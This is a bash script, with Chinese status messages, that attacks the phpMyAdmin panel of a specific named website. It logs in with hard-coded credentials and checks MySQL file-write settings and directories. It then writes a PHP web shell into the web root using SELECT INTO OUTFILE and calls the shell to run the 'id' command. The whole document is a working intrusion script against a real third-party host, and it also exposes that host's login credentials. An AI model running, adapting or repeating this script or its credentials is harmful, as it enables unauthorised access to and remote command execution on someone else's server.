#!/bin/bash

URL="https://olympic.su.ac.th/phpmyadmin/"
COOKIES="/tmp/pmacookies.txt"

curl -k -s -c "$COOKIES" "$URL" > /dev/null
TOKEN=$(curl -k -s -b "$COOKIES" -c "$COOKIES" -X POST "${URL}index.php" \
  -d "pma_username=mysql&pma_password=Mu123.123.&server=1" -L | \
  grep -oP 'token=\K[^"&]+' | head -1)

echo "[*] 查询secure_file_priv设置..."
curl -k -s -b "$COOKIES" "${URL}server_sql.php?db=mysql&token=$TOKEN" \
  -d "sql_query=SHOW VARIABLES LIKE 'secure_file_priv';" \
  -X POST | grep -A 5 "secure_file_priv" | head -10

echo ""
echo "[*] 查询basedir和datadir..."
curl -k -s -b "$COOKIES" "${URL}server_sql.php?db=mysql&token=$TOKEN" \
  -d "sql_query=SELECT @@basedir,@@datadir;" \
  -X POST | grep -oP '<td class="value">[^<]+</td>' | head -5

echo ""
echo "[*] 尝试通过phpmyadmin目录写入..."
curl -k -s -b "$COOKIES" "${URL}server_sql.php?db=mysql&token=$TOKEN" \
  -d "sql_query=SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/phpmyadmin/shell.php';" \
  -X POST | grep -i "error\|1064\|1045" | head -3

sleep 2
curl -k -s "https://olympic.su.ac.th/phpmyadmin/shell.php?cmd=id" | head -3
